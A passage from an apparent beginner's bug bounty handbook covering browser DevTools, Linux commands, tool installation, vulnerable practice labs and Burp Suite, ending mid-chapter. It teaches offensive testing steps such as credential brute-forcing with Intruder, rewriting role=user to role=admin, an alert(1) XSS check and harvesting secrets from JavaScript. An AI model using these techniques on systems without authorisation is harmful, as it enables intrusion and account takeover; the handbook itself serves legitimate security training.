- [ ] Is `Host` header validated? (Host injection)
- [ ] Are there custom headers that might affect behavior?
- [ ] Does changing `Content-Type` change behavior?
- [ ] Does adding `X-Forwarded-For` bypass IP restrictions?
- [ ] Is `Authorization` a JWT? Is it validated properly?

**Response Headers to Check:**

- [ ] Is `Content-Security-Policy` present and restrictive?
- [ ] Is `X-Frame-Options` or CSP `frame-ancestors` set?
- [ ] Is `Strict-Transport-Security` present?
- [ ] Are `X-Content-Type-Options: nosniff` present?
- [ ] Does `Server` or `X-Powered-By` reveal version info?

**Cookie Checks:**

- [ ] Are all sensitive cookies `HttpOnly`?
- [ ] Are all cookies `Secure`?
- [ ] Is `SameSite` set appropriately?
- [ ] Are session tokens sufficiently random?
- [ ] Do session tokens expire properly?

**Status Code Anomalies:**

- [ ] Do 403 responses actually prevent action, or just hide UI?
- [ ] Do 404 responses differ based on resources that exist vs. do not exist?
- [ ] Do 500 errors reveal error messages or stack traces?

## Summary

HTTP is the language of the web. Every web application security test is ultimately an exercise in crafting, sending, and analyzing HTTP requests and responses. Understanding HTTP methods, status codes, headers, cookies, and body formats is foundational to testing every vulnerability class in this handbook.

## Checklist

- [ ] Can explain what HTTP is and how it works
- [ ] Know the common HTTP methods and their security implications
- [ ] Can interpret any HTTP status code
- [ ] Understand the common request headers and their security relevance
- [ ] Understand the common response headers and their security relevance
- [ ] Understand how cookies work and which cookie flags matter
- [ ] Can identify the content type of a request body
- [ ] Know what makes a cookie insecure

---

# Chapter 4: Browsers and Developer Tools

## Objective

Master the browser's built-in developer tools to inspect HTTP traffic, examine JavaScript, explore storage, and analyze web application behavior — all without installing any additional software.

## Prerequisites

Chapters 2 and 3 complete.

## Terminology

|Term|Definition|
|---|---|
|**DevTools**|The built-in developer tools in modern browsers|
|**DOM**|Document Object Model — the browser's representation of a web page's structure|
|**JavaScript**|The programming language that runs in browsers|
|**Same-Origin Policy**|Browser security rule — prevents pages from accessing data from different origins|
|**Local Storage**|Browser storage that persists after the window is closed|
|**Session Storage**|Browser storage that is cleared when the tab is closed|
|**IndexedDB**|A more advanced browser database|
|**Service Worker**|A script that runs in the background, intercepts network requests|
|**WebSocket**|A protocol for persistent, two-way connections between browser and server|

## Theory

### The Browser: Your Primary Testing Tool

Modern web browsers — Chrome, Firefox, Edge — contain incredibly powerful built-in tools for examining web applications. These tools were designed for web developers to debug their code, but for security researchers they are indispensable for understanding how an application works.

You should learn to use browser DevTools before learning any external tool. Everything you can do with Burp Suite in terms of inspecting requests and responses, you can first learn conceptually in DevTools.

### Opening Developer Tools

**Chrome/Edge:**

- Press `F12` or `Ctrl+Shift+I` (Windows/Linux) or `Cmd+Option+I` (Mac)
- Or right-click anywhere on the page and select "Inspect"

**Firefox:**

- Press `F12` or `Ctrl+Shift+I`
- Or right-click and select "Inspect Element"

### The DevTools Panels

#### The Elements Panel

The Elements panel shows you the HTML structure (DOM) of the current page. You can:

- Inspect the source code of any element
- Modify HTML and CSS in real time (changes are only local, not sent to server)
- Look for comments that developers left in the code (sometimes containing credentials, TODOs, or sensitive info)
- Find hidden form fields
- Discover JavaScript variables and functions

**How to use:**

1. Open DevTools (F12)
2. Click the "Elements" tab
3. Click the cursor icon (top-left of DevTools) and then click any element on the page
4. That element will be highlighted in the HTML tree

**Bug bounty applications:**

- Look for hidden input fields: `<input type="hidden" name="admin" value="false">`
- Look for HTML comments: `<!-- TODO: remove this before production -->`
- Find disabled buttons that might work if you remove the `disabled` attribute
- Find form fields that are hidden but still processed by the server

#### The Console Panel

The Console is where JavaScript errors, logs, and warnings appear. You can also type JavaScript directly here and execute it.

**How to use:**

1. Click the "Console" tab
2. Type JavaScript and press Enter to execute it

**Useful commands:**

```javascript
// View all cookies accessible to JavaScript
document.cookie

// View local storage
localStorage

// View session storage
sessionStorage

// Find all forms on the page
document.querySelectorAll('form')

// Find all links
document.querySelectorAll('a')

// Find all scripts
document.querySelectorAll('script')

// See what's stored in a specific localStorage key
localStorage.getItem('user')

// Read all localStorage keys and values
for (let i = 0; i < localStorage.length; i++) {
  let key = localStorage.key(i);
  console.log(key, localStorage.getItem(key));
}
```

**Bug bounty applications:**

- Check for sensitive data in `localStorage` (tokens, user info)
- Look for JavaScript errors that reveal internal paths or function names
- Execute JavaScript to test for XSS (if you can execute `alert(1)`, the site is vulnerable)

#### The Network Panel

The Network panel is your window into all HTTP traffic between the browser and server. This is arguably the most important panel for bug bounty hunting.

**How to use:**

1. Open DevTools
2. Click the "Network" tab
3. Check "Preserve log" so requests are not cleared on navigation
4. Reload the page or perform actions
5. All requests appear in the list

**For each request, you can see:**

- The request URL and method
- The request headers
- The request body (for POST requests)
- The response status code
- The response headers
- The response body

**To inspect a specific request:**

1. Click on any request in the list
2. Look at the "Headers" sub-tab for request and response headers
3. Look at the "Payload" sub-tab for the request body
4. Look at the "Response" sub-tab for the response body
5. Look at the "Preview" sub-tab for a rendered preview of the response

**To modify and resend a request (Firefox):**

1. Right-click a request
2. Select "Edit and Resend"
3. Modify the request
4. Click "Send"

**Bug bounty applications:**

- Find API calls you did not know existed
- Inspect authentication tokens and session cookies
- Find request parameters to test for injection
- Discover internal API endpoints
- Check what data is sent when you perform actions

**Filtering requests:**

- Type in the filter box to search by URL
- Use `XHR` filter to show only AJAX requests (background API calls)
- Use `WS` filter to see WebSocket connections

#### The Application Panel

This panel shows all data stored in the browser:

**Cookies:**

1. In Application panel, expand "Cookies" in the left sidebar
2. Click on the domain
3. See all cookies — name, value, domain, path, expiry, and security flags

Look for:

- Missing `HttpOnly` flag
- Missing `Secure` flag
- Missing `SameSite` attribute
- Session tokens that look predictable or decryptable (e.g., base64-encoded user IDs)

**Local Storage:**

1. Expand "Local Storage" in the sidebar
2. Click the domain
3. See all key-value pairs

Look for:

- Authentication tokens stored in localStorage (unsafe — XSS can steal them)
- User information
- Application state

**Session Storage:** Similar to Local Storage but cleared when the tab closes.

#### The Sources Panel

Shows all JavaScript files loaded by the page. You can:

- Browse all source files
- Search across all files
- Set breakpoints (pause execution at a specific line)
- Step through JavaScript execution

**To search all files:**

1. Go to Sources panel
2. Press `Ctrl+Shift+F` to open global search
3. Search for strings like "api_key", "password", "secret", "token", "internal"

**Bug bounty applications:**

- Find hardcoded API keys in JavaScript files
- Find hidden API endpoints referenced in code
- Find commented-out debug code
- Understand how authentication works on the client side

### Useful Browser Extensions for Bug Bounty

|Extension|Purpose|
|---|---|
|**Wappalyzer**|Identifies technologies used by websites|
|**Cookie-Editor**|Easily view and modify cookies|
|**JSONView**|Formats JSON responses for readability|
|**FoxyProxy**|Manages proxy settings for Burp Suite|

### Practical Workflow: Exploring a New Target

When you encounter a new web application, here is how to use DevTools to understand it:

**Step 1:** Open DevTools (F12) before doing anything.

**Step 2:** Go to the Network tab and enable "Preserve log."

**Step 3:** Browse the entire application as a normal user would. Log in, navigate every page, use every feature. Watch what requests are made.

**Step 4:** Look at the Application tab — examine cookies (note their flags), Local Storage, and Session Storage.

**Step 5:** Go to the Sources panel and search for keywords: `api_key`, `secret`, `password`, `token`, `internal`, `admin`.

**Step 6:** In the Console, run `document.cookie` to see what cookies JavaScript can access.

**Step 7:** Identify interesting endpoints, parameters, and data flows for further testing.

## Summary

Browser DevTools are free, built-in, and powerful. The Network panel lets you inspect all HTTP traffic. The Application panel reveals stored cookies and data. The Sources panel exposes JavaScript code and potential secrets. The Console lets you execute JavaScript. Mastery of DevTools is a prerequisite for effective bug bounty hunting.

## Checklist

- [ ] Can open DevTools and navigate between panels
- [ ] Can inspect any HTTP request in the Network panel
- [ ] Can view request headers, body, and response
- [ ] Can examine all cookies in the Application panel
- [ ] Can check cookie security flags
- [ ] Can search JavaScript source files for sensitive strings
- [ ] Can execute JavaScript in the Console
- [ ] Can read Local Storage and Session Storage contents
- [ ] Have installed Wappalyzer

---

# Chapter 5: Linux for Bug Bounty Hunters

## Objective

Learn the Linux command-line skills essential for running bug bounty tools, processing output, writing scripts, and operating efficiently as a security researcher.

## Prerequisites

Chapters 1-4 complete.

## Terminology

|Term|Definition|
|---|---|
|**Terminal**|A text-based interface for interacting with the operating system|
|**Shell**|The program that interprets your commands (bash, zsh, sh)|
|**Command**|An instruction given to the shell|
|**Flag / Option**|A modifier that changes a command's behavior (e.g., `-v` for verbose)|
|**Argument**|The target of a command (e.g., a filename or URL)|
|**Pipe**|Sends the output of one command as input to another (`|
|**Redirect**|Sends output to a file (`>` or `>>`)|
|**stdin/stdout/stderr**|Standard input, output, and error streams|
|**Process**|A running program|
|**File permissions**|Control who can read, write, or execute a file|
|**Root / sudo**|Superuser with elevated privileges|
|**PATH**|A list of directories the shell searches for commands|

## Theory

### Why Linux?

Nearly every bug bounty tool runs on Linux. Linux is free, powerful, scriptable, and the operating system of most web servers you will test. Security researchers overwhelmingly use Linux — specifically Kali Linux or Parrot OS, which come with many security tools pre-installed.

**Recommended distribution:** Kali Linux (kali.org) — free, Debian-based, pre-loaded with security tools.

**Alternatives:**

- Parrot OS — similar to Kali, some prefer its interface
- Ubuntu — general-purpose, good for building your own environment
- WSL (Windows Subsystem for Linux) — run Linux on Windows

### Setting Up Your Environment

**Option 1: Virtual Machine (Recommended for beginners)**

1. Install VirtualBox (free) or VMware
2. Download Kali Linux ISO from kali.org
3. Create a new VM with at least 4GB RAM and 50GB disk
4. Boot from the ISO and install

**Option 2: WSL on Windows**

1. Open PowerShell as Administrator
2. Run: `wsl --install`
3. Restart
4. Install Kali from the Microsoft Store

**Option 3: Dual Boot** Install Linux alongside Windows, choose at startup.

### The Terminal: Your Cockpit

When you open a terminal, you see a **prompt** that looks like:

```
alice@kali:~$
```

This tells you:

- `alice` — your username
- `kali` — your computer's hostname
- `~` — your current directory (`~` means your home directory)
- `$` — you are a regular user (not root)

If you see `#` instead of `$`, you are running as root (superuser). Be careful.

### Essential Commands

#### Navigation

```bash
# Print Working Directory — shows where you are
pwd

# List files and directories
ls

# List with details (permissions, size, date)
ls -la

# Change Directory
cd /path/to/directory

# Go to home directory
cd ~
# or just
cd

# Go up one directory
cd ..

# Go to the previous directory
cd -
```

#### Files and Directories

```bash
# Create a directory
mkdir my_project

# Create nested directories
mkdir -p my_project/recon/subdomains

# Create an empty file
touch notes.txt

# Copy a file
cp source.txt destination.txt

# Copy a directory and its contents
cp -r source_dir/ destination_dir/

# Move or rename
mv old_name.txt new_name.txt

# Delete a file (CAREFUL — no trash, immediate)
rm file.txt

# Delete a directory and all contents (VERY CAREFUL)
rm -rf directory/

# View file contents
cat file.txt

# View large files page by page
less file.txt
# Press q to quit, space for next page, / to search

# View first 10 lines
head file.txt

# View last 10 lines
tail file.txt

# View last 10 lines and keep updating (useful for logs)
tail -f logfile.txt
```

#### Searching and Filtering

```bash
# Search for text in a file
grep "pattern" file.txt

# Search case-insensitively
grep -i "pattern" file.txt

# Search recursively in a directory
grep -r "pattern" /path/to/dir/

# Search and show line numbers
grep -n "pattern" file.txt

# Find files by name
find /path -name "filename.txt"

# Find files modified in last 24 hours
find /path -mtime -1

# Find files larger than 10MB
find /path -size +10M
```

#### Processing Text (ESSENTIAL for bug bounty)

```bash
# Sort lines alphabetically
sort file.txt

# Sort and remove duplicates
sort -u file.txt

# Remove duplicate lines (must be sorted first)
uniq file.txt

# Count lines
wc -l file.txt

# Get only the second field, split by comma
cut -d',' -f2 file.txt

# Replace text
sed 's/old/new/g' file.txt

# Replace in-place (modifies the file)
sed -i 's/old/new/g' file.txt

# Complex text processing
awk '{print $1}' file.txt    # Print first column
awk -F',' '{print $2}' file.csv  # CSV second column
```

#### Pipes and Redirection

Pipes are among the most powerful Linux features:

```bash
# Send output of command1 to command2
command1 | command2

# Example: Find all subdomains and sort them uniquely
cat subdomains.txt | sort -u

# Save output to a file (overwrites existing)
command > output.txt

# Append to a file
command >> output.txt

# Discard error messages
command 2>/dev/null

# Save both output and errors
command > output.txt 2>&1

# Real-world example: Run subfinder, sort results, save to file
subfinder -d example.com | sort -u > subdomains.txt
```

#### Networking Commands

```bash
# Test connectivity
ping google.com

# DNS lookup
nslookup example.com

# Detailed DNS lookup
dig example.com

# All DNS records
dig example.com ANY

# Trace DNS resolution path
dig +trace example.com

# Show open network connections
netstat -tuln

# HTTP request (we cover this in depth in Chapter 8)
curl https://example.com

# Show your IP address
ip addr show
# or
ifconfig
```

#### Package Management (Installing Tools)

```bash
# Update package list
sudo apt update

# Upgrade installed packages
sudo apt upgrade

# Install a package
sudo apt install tool-name

# Install Python packages
pip3 install tool-name
pip3 install tool-name --break-system-packages

# Install Go tools (many bug bounty tools are written in Go)
go install github.com/author/tool@latest
```

#### Permissions

```bash
# Make a script executable
chmod +x script.sh

# Run a script
./script.sh

# Run with elevated privileges
sudo ./script.sh

# Change file owner
chown user:group file.txt
```

### Shell Scripting Basics

A bash script is a file containing a series of commands. You can automate repetitive tasks.

**Simple script example — test a list of domains:**

```bash
#!/bin/bash
# The above line tells the system this is a bash script

# Read a list of domains from a file and test each one
while read domain; do
    echo "Testing: $domain"
    curl -s -o /dev/null -w "%{http_code}" "https://$domain"
    echo ""
done < domains.txt
```

Save as `test_domains.sh`, make executable with `chmod +x test_domains.sh`, run with `./test_domains.sh`.

**Variables:**

```bash
domain="example.com"
echo "Testing $domain"
```

**Conditional logic:**

```bash
if [ $? -eq 0 ]; then
    echo "Success"
else
    echo "Failed"
fi
```

**Loops:**

```bash
# Loop over items
for item in apple banana cherry; do
    echo "Item: $item"
done

# Loop over lines in a file
while read line; do
    echo "Line: $line"
done < file.txt

# Loop with counter
for i in {1..10}; do
    echo "Number: $i"
done
```

### Useful Tools You Should Know

```bash
# jq — parse and process JSON (essential for API responses)
echo '{"name": "alice", "role": "admin"}' | jq '.role'
# Output: "admin"

# Extract multiple fields
cat response.json | jq '{name: .name, id: .id}'

# Process arrays
cat users.json | jq '.[].email'

# httpx — check which hosts are alive (Chapter 9)
cat domains.txt | httpx -silent

# anew — add only new lines to a file (deduplicate)
cat new_results.txt | anew existing_results.txt
```

### Environment Variables

Environment variables store configuration values:

```bash
# Set a variable (current session only)
export API_KEY="your_key_here"

# Use it
echo $API_KEY

# Make permanent — add to ~/.bashrc
echo 'export API_KEY="your_key_here"' >> ~/.bashrc
source ~/.bashrc
```

### Directory Structure for Bug Bounty

Organize your work consistently:

```
~/bugbounty/
├── targets/
│   ├── example.com/
│   │   ├── recon/
│   │   │   ├── subdomains.txt
│   │   │   ├── urls.txt
│   │   │   ├── js_files.txt
│   │   │   └── parameters.txt
│   │   ├── screenshots/
│   │   ├── vulnerabilities/
│   │   │   ├── xss/
│   │   │   ├── sqli/
│   │   │   └── idor/
│   │   └── reports/
│   └── another-target.com/
├── wordlists/
│   ├── subdomains.txt
│   ├── directories.txt
│   └── parameters.txt
└── tools/
```

Create this structure with:

```bash
mkdir -p ~/bugbounty/targets/example.com/{recon,screenshots,vulnerabilities/{xss,sqli,idor},reports}
mkdir -p ~/bugbounty/{wordlists,tools}
```

## Practice Labs

- **OverTheWire Bandit** (overthewire.org/wargames/bandit/) — Learn Linux by solving challenges. Start at Level 0. Complete all levels.
- **TryHackMe — Linux Fundamentals** — Three-part series teaching Linux basics in a gamified environment.

## Summary

Linux is the operating system of professional security researchers. The essential skills are: navigating the filesystem, reading and writing files, searching and filtering text, using pipes to chain commands, basic shell scripting, and networking commands. Build good organizational habits from the start by maintaining a consistent directory structure for your bug bounty work.

## Checklist

- [ ] Kali Linux or equivalent is installed and accessible
- [ ] Can navigate the filesystem (pwd, cd, ls)
- [ ] Can create, copy, move, and delete files and directories
- [ ] Can read files (cat, less, head, tail)
- [ ] Can search files with grep
- [ ] Can filter and process text (sort, uniq, cut, awk, sed)
- [ ] Can use pipes and redirection
- [ ] Can install packages with apt and pip
- [ ] Can write and execute a simple bash script
- [ ] Can use jq to parse JSON
- [ ] Have created the bug bounty directory structure
- [ ] Have completed OverTheWire Bandit Levels 0-15

---

# Chapter 6: Setting Up Your Bug Bounty Lab Environment

## Objective

Build a complete, professional bug bounty testing environment with all necessary tools installed, configured, and ready to use.

## Prerequisites

Chapters 1-5 complete. Kali Linux or equivalent is installed.

## Theory

### What You Need

A professional bug bounty environment has four layers:

1. **Operating System:** Kali Linux (or Parrot/Ubuntu)
2. **Proxy:** Burp Suite (to intercept and modify traffic)
3. **Tools:** Reconnaissance and testing tools
4. **Targets:** Legal practice environments

### Essential Tools List

|Category|Tool|Purpose|
|---|---|---|
|**Proxy**|Burp Suite Community|Intercept and modify HTTP traffic|
|**Recon**|subfinder|Fast subdomain enumeration|
|**Recon**|amass|Comprehensive subdomain enumeration|
|**Recon**|assetfinder|Quick subdomain finding|
|**Recon**|httpx|Probe HTTP services|
|**Recon**|waybackurls|Get historical URLs|
|**Recon**|gau|Get all URLs from multiple sources|
|**Recon**|katana|Web crawler|
|**Recon**|dnsx|DNS toolkit|
|**Recon**|nuclei|Vulnerability scanner|
|**Fuzzing**|ffuf|Web fuzzer|
|**Scanning**|nmap|Port scanner|
|**HTTP**|curl|HTTP requests from command line|
|**Processing**|jq|JSON processing|
|**Processing**|anew|Append new lines to files|
|**SQL**|sqlmap|Automated SQL injection|
|**JavaScript**|gf|Pattern matching in URLs|
|**JavaScript**|LinkFinder|Find URLs in JavaScript|
|**Wordlists**|SecLists|Comprehensive wordlist collection|

### Installation Script

Create and run this installation script on Kali Linux:

```bash
#!/bin/bash
# Bug Bounty Environment Setup Script
# Run with: bash setup.sh

echo "=== Setting up Bug Bounty Environment ==="

# Update system
echo "[*] Updating system..."
sudo apt update && sudo apt upgrade -y

# Install base dependencies
echo "[*] Installing dependencies..."
sudo apt install -y golang-go python3 python3-pip git curl wget jq nmap \
                    chromium dnsutils whois

# Set up Go environment
echo "[*] Setting up Go..."
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc
source ~/.bashrc
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin

# Install Go-based tools
echo "[*] Installing Go tools..."
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/tomnomnom/anew@latest
go install -v github.com/tomnomnom/gf@latest
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/ffuf/ffuf/v2@latest

# Install Python tools
echo "[*] Installing Python tools..."
pip3 install --break-system-packages dirsearch linkfinder

# Install Amass
echo "[*] Installing Amass..."
go install -v github.com/owasp-amass/amass/v4/...@master

# Install sqlmap
echo "[*] Installing sqlmap..."
sudo apt install -y sqlmap

# Install wordlists
echo "[*] Installing SecLists..."
sudo apt install -y seclists
# Or manually:
# git clone https://github.com/danielmiessler/SecLists.git ~/wordlists/SecLists

# Create directory structure
echo "[*] Creating directory structure..."
mkdir -p ~/bugbounty/{targets,wordlists,tools,reports}

echo "=== Installation Complete ==="
echo "Please run: source ~/.bashrc"
echo "Then verify with: subfinder -version"
```

Save this as `setup.sh` and run:

```bash
chmod +x setup.sh
bash setup.sh
```

### Practice Target Environments

You need legal targets to practice on. These environments are intentionally vulnerable:

**OWASP Juice Shop** (most recommended for beginners):

```bash
# Install with Docker
docker pull bkimminich/juice-shop
docker run --rm -p 3000:3000 bkimminich/juice-shop
# Access at http://localhost:3000
```

**DVWA (Damn Vulnerable Web Application):**

```bash
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
# Access at http://localhost:80
# Default credentials: admin / password
```

**WebGoat:**

```bash
docker pull webgoat/goat-and-wolf
docker run --rm -it -p 8080:8080 -p 9090:9090 webgoat/goat-and-wolf
# Access at http://localhost:8080/WebGoat
```

**PortSwigger Web Security Academy:**

- Free, no installation needed
- Go to portswigger.net/web-security
- Create a free account
- Access hundreds of interactive labs

### Browser Configuration for Testing

**Configure Firefox for security testing:**

1. Install FoxyProxy extension (for easy proxy switching)
2. Install Cookie-Editor extension
3. Install Wappalyzer extension

**Configure FoxyProxy for Burp Suite:**

1. Open FoxyProxy Options
2. Add a new proxy: `127.0.0.1:8080`
3. Give it a name: "Burp Suite"
4. You can now switch between direct and proxied browsing with one click

### Setting Up Burp Suite

(Full Burp Suite guide is in Chapter 7, but here is the initial setup)

1. **Download:** portswigger.net/burp/communitydownload (free Community edition)
2. **Install:** Run the installer
3. **First Launch:** Click "Start Burp"
4. **Configure browser to use Burp as proxy:**
    - Burp listens on `127.0.0.1:8080` by default
    - In Firefox, go to Settings → Network Settings → Manual proxy → `127.0.0.1:8080`
5. **Install Burp CA certificate:**
    - With Burp running and browser proxied to it
    - Visit `http://burpsuite` in the browser
    - Download the CA certificate
    - In Firefox: Settings → Search "certificates" → View Certificates → Import
    - This allows Burp to intercept HTTPS traffic

## Summary

A complete bug bounty environment includes Kali Linux, Burp Suite, a suite of Go and Python-based tools, wordlists, and legal practice targets. Setting this up correctly at the start saves countless hours later. Practice every tool in a legal environment before using it on real targets.

## Checklist

- [ ] Operating system (Kali or equivalent) is installed
- [ ] All tools from the installation script are installed
- [ ] Go PATH is configured correctly
- [ ] subfinder works: `subfinder -version`
- [ ] httpx works: `httpx -version`
- [ ] ffuf works: `ffuf -h`
- [ ] nuclei works: `nuclei -version`
- [ ] Burp Suite is installed and opens
- [ ] Browser is configured to use Burp as proxy
- [ ] Burp CA certificate is installed in browser
- [ ] At least one practice target (Juice Shop or DVWA) is accessible
- [ ] Directory structure is created in ~/bugbounty/


# PART TWO: TOOLS

---

# Chapter 7: Burp Suite — The Complete Guide

## Objective

Master Burp Suite Community Edition — the single most important tool in a web application penetration tester's toolkit. Learn every panel, workflow, and technique needed for effective bug bounty testing.

## Prerequisites

Chapter 6 complete. Burp Suite installed and browser configured.

## Terminology

|Term|Definition|
|---|---|
|**Proxy**|A server that sits between your browser and the target, intercepting traffic|
|**Intercept**|Pausing a request before it is sent, allowing modification|
|**Repeater**|Resend requests with modifications and compare responses|
|**Intruder**|Automated fuzzing and brute-forcing tool|
|**Scanner**|Automated vulnerability scanner (Pro only)|
|**Scope**|The set of hosts/URLs you want to test|
|**Target**|The site map and scope definition|
|**Decoder**|Encode/decode data in various formats|
|**Comparer**|Compare two pieces of data|
|**Logger**|View all HTTP traffic through Burp|

## Theory

### What Is Burp Suite?

Burp Suite is an integrated platform for web application security testing developed by PortSwigger. It acts as a proxy that sits between your browser and the target web application, allowing you to intercept, inspect, modify, and replay every HTTP request and response.

Think of it as a complete laboratory for HTTP traffic. Every request your browser makes goes through Burp first, where you can see it, stop it, change it, send it again, and analyze the response.

```
WITHOUT BURP:
Browser ──────────────────────────────────────────► Web Server
        HTTP Request                                HTTP Response
        ◄──────────────────────────────────────────

WITH BURP:
Browser ──────► BURP SUITE ──────────────────────► Web Server
        HTTP    │ Intercept  │    HTTP
        Request │ Inspect    │    Request
                │ Modify     │◄──
                │ Repeat     │
                │ Scan       │
```

### Burp Suite Editions

|Edition|Cost|Key Features|
|---|---|---|
|**Community**|Free|Proxy, Repeater, Intruder (throttled), Decoder, Comparer|
|**Professional**|~$449/year|All above + active scanner, faster Intruder, extensions|
|**Enterprise**|Custom|Scalable automated scanning|

This handbook focuses on Community Edition because it is free, and the core manual testing skills apply to all editions.

### The Burp Suite Interface

When you open Burp Suite, you see tabs across the top:

```
[Burp] [Project] [User options]
│
Dashboard | Target | Proxy | Intruder | Repeater | Decoder | Comparer | Logger | Organizer
```

## Panel-by-Panel Guide

### 1. Dashboard

The Dashboard shows:

- Active and completed scans (Pro only)
- Event log — messages and errors from Burp
- Issue activity — found vulnerabilities
- Advisory — information about issues

**For Community Edition users:** The Dashboard shows the event log. Check here if something is not working.

### 2. Target

The Target panel has two sub-tabs:

**Site map:** A hierarchical view of all URLs you have visited through Burp. Shows the structure of the target application.

**Scope:** Define what is in scope. This is critical — Burp uses scope to filter logging, scanning, and crawling.

**Setting up scope:**

1. Go to Target → Scope
2. Click "Add" in "Include in scope"
3. Enter the target URL: `https://example.com`
4. Or enter a regex: `.*\.example\.com`
5. Now Burp will focus on this target

**Why scope matters:** If you add `example.com` to scope, Burp will only log and process traffic to that domain. This prevents noise from other sites you visit.

### 3. Proxy — The Heart of Burp Suite

The Proxy panel is where you intercept and inspect traffic.

**Sub-tabs:**

- **Intercept:** Toggle interception on/off, view intercepted requests
- **HTTP history:** Log of all HTTP requests/responses
- **WebSockets history:** Log of WebSocket messages
- **Options:** Proxy listener configuration

#### Intercept Tab

When intercept is ON, every request is paused and displayed here before being sent. You can:

- Read the full request
- Modify any part of the request
- Forward the request (send it as-is or modified)
- Drop the request (cancel it)

**The intercept buttons:**

- **Forward:** Send this request and pause the next
- **Drop:** Cancel this request
- **Intercept is on/off:** Toggle interception
- **Action:** Opens a context menu with additional options

**Typical workflow:**

1. Turn Intercept ON
2. In the browser, click a button or submit a form
3. Burp pauses the request
4. Examine the request in the Intercept panel
5. Modify if needed
6. Click Forward
7. Request is sent to server
8. (If "Intercept responses" is on, response is paused too)

**Common beginner mistake:** Leaving intercept ON and then wondering why the browser is frozen. Always remember to Forward or Drop, or turn intercept OFF.

#### HTTP History Tab

This is your complete log of all HTTP traffic. Every request and response is stored here.

**How to use it:**

1. Turn intercept OFF (let traffic flow through)
2. Browse the target application normally
3. Come back to HTTP History to review what happened

**Columns:**

- `#` — Request number
- `Host` — Target server
- `Method` — GET, POST, etc.
- `URL` — The path
- `Params` — Whether the request has parameters
- `Status` — HTTP status code
- `Length` — Response body length
- `MIME type` — Response content type
- `Time` — Response time
- `Comment` — Your notes

**To examine a request:** Click any row to see the request (left panel) and response (right panel).

**To send to Repeater:** Right-click a request → Send to Repeater

**To send to Intruder:** Right-click a request → Send to Intruder

**Filtering the log:** Use the filter bar at the top to filter by status code, content type, search string, etc.

#### Options Tab (Proxy Settings)

**Proxy listener:**

- Default: `127.0.0.1:8080`
- You can add additional listeners on different ports

**Response modification:**

- Automatically modify server responses (e.g., unhide hidden form fields)
- Useful for bypassing client-side controls

**Match and Replace:** A powerful feature that automatically modifies requests/responses:

1. Go to Proxy → Options → Match and Replace
2. Add rules like: Replace `role=user` with `role=admin` in all requests
3. This happens automatically without you having to manually intercept each request

### 4. Repeater — Your Most-Used Tool

Repeater lets you resend HTTP requests with modifications and see the responses. It is the tool you will use most.

**How to get a request into Repeater:**

- From HTTP History: Right-click → Send to Repeater
- From Intercept: Right-click → Send to Repeater
- Keyboard shortcut: Ctrl+R

**The Repeater interface:**

```
[Request]                    [Response]
─────────────────────────────────────────────────────
POST /login HTTP/1.1         HTTP/1.1 302 Found
Host: example.com            Location: /dashboard
Content-Type: ...            Set-Cookie: session=abc
                             
username=alice&              
password=secret              
─────────────────────────────────────────────────────
[Send]  [Cancel]
```

**Typical workflow:**

1. Find an interesting request in HTTP History
2. Right-click → Send to Repeater
3. In Repeater, click Send to see the original response
4. Modify the request (change a parameter, add a payload, change a header)
5. Click Send again
6. Compare the new response to the original
7. Repeat, adjusting your modifications based on the response

**The power of Repeater:** You can rapidly iterate on a request, trying different payloads, observing how the application responds differently. This is how you confirm vulnerabilities and refine payloads.

**Multiple tabs:** Repeater can have many tabs open simultaneously. Rename tabs by double-clicking the tab name.

**Comparison:** Use Ctrl+Click on the Response panel to pop it out, allowing side-by-side comparison.

### 5. Intruder — Automated Fuzzing

Intruder automates the process of sending many requests with varied payloads. It is used for:

- Brute-forcing login credentials
- Fuzzing parameters for injection vulnerabilities
- Enumerating IDs to find IDOR vulnerabilities
- Testing all possible values of a parameter

**Note:** In Community Edition, Intruder is throttled (rate-limited). This makes it slow for large attacks. Professionals use ffuf or other tools for heavy fuzzing. But Intruder is useful for smaller, targeted attacks.

**How to use Intruder:**

**Step 1:** Send a request to Intruder (right-click → Send to Intruder, or Ctrl+I)

**Step 2:** In the Intruder panel, go to the "Positions" tab.

You see your request with `§` markers around parameters:

```
POST /login HTTP/1.1
Host: example.com

username=§alice§&password=§secret§
```

The `§` markers define where Intruder will inject payloads. Clear the auto-selected positions (Clear §) and manually select the positions you want to fuzz.

**Step 3:** Choose an attack type:

|Type|Description|Use Case|
|---|---|---|
|**Sniper**|One payload list, one position at a time|Testing a single parameter|
|**Battering ram**|One payload list, same payload in all positions|Same value everywhere|
|**Pitchfork**|Multiple payload lists, parallel|Username + Password pairs|
|**Cluster bomb**|Multiple payload lists, all combinations|Brute-force (all combos)|

**Step 4:** Go to the "Payloads" tab and configure your payload list.

**Payload types:**

- **Simple list:** Enter a list of values manually or load from a file
- **Runtime file:** Read payloads from a file during the attack
- **Numbers:** Generate numerical sequences
- **Dates:** Generate date sequences
- **Brute forcer:** Generate all character combinations

**Step 5:** Configure options:

- **Number of threads:** How many concurrent requests (Community is throttled)
- **Follow redirects:** Whether to follow 302 redirects
- **Grep Match:** Flag responses containing a string
- **Grep Extract:** Extract data from responses

**Step 6:** Click "Start attack."

**Step 7:** Sort results by response length or status code to find anomalies.

**Analyzing results:**

- Different status code = interesting (403 vs 200)
- Different response length = different behavior
- Different response time = possible blind injection

### 6. Decoder

Decoder helps you encode and decode data in various formats — essential for understanding encoded parameters, tokens, and payloads.

**Supported encodings:**

- URL encoding (`%20` → space)
- Base64 (`YWxpY2U=` → `alice`)
- HTML entities (`&amp;` → `&`)
- Hex
- Gzip
- Smart decode (automatically detects encoding)

**How to use:**

1. Go to Decoder tab
2. Paste encoded text in the top box
3. Click "Decode as..." → choose encoding
4. See decoded result

**Or use "Smart decode" to automatically identify and decode:**

